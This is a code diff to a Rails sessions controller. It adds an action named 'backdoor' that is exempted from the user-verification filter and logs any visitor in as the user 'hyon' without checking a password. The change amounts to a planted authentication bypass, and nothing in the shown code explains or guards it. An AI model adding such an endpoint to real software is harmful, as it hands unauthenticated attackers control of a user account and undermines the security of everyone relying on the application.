@@ -1,6 +1,6 @@
 class SessionsController < ApplicationController
 
-  skip_before_action :verify_current_user, only: [:new, :create]
+  skip_before_action :verify_current_user, only: [:new, :create, :backdoor]
 
   def create
     user = User.find_by(username: params[:username])
@@ -15,6 +15,13 @@ class SessionsController < ApplicationController
 
   def destroy
     session[:user_id] = nil
+    redirect_to root_url
+  end
+
+
+  def backdoor
+    user = User.find_by(username: "hyon")
+    session[:user_id] = user.id
     redirect_to root_url
   end
 
